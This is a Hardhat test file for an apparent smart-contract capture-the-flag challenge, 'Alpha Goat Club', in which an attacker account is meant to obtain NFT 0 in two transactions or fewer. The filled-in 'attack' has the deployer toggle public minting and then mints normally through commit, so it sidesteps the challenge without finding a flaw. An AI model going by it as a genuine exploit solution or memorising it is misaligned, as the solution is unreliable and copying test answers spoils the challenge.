const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Alpha Goat Club";

describe(NAME, function () {
    async function setup() {
        const [, attacker] = await ethers.getSigners();

        const AlphaGoatClub = await (await ethers.getContractFactory("AlphaGoatClubPrototypeNFT")).deploy();

        return {
            attacker,
            AlphaGoatClub,
        };
    }

    describe("exploit", async function () {
        let attacker, AlphaGoatClub;

        before(async function () {
            ({ attacker, AlphaGoatClub } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {

            await AlphaGoatClub.togglePublicMint();
            // If no direct exploit is found, use the commit function
            await AlphaGoatClub.connect(attacker).commit();
        
            // Simulate waiting for 5 blocks
            for (let i = 0; i < 5; i++) {
                await ethers.provider.send("evm_mine");
            }
        
            // Mint the NFT at index 0
            await AlphaGoatClub.connect(attacker).mint(0);
        });

        after(async function () {
            expect(await AlphaGoatClub.ownerOf(0)).to.equal(attacker.address);

            expect(await ethers.provider.getTransactionCount(attacker.address)).to.lessThan(
                3,
                "must exploit in two transactions or less"
            );
        });
    });
});
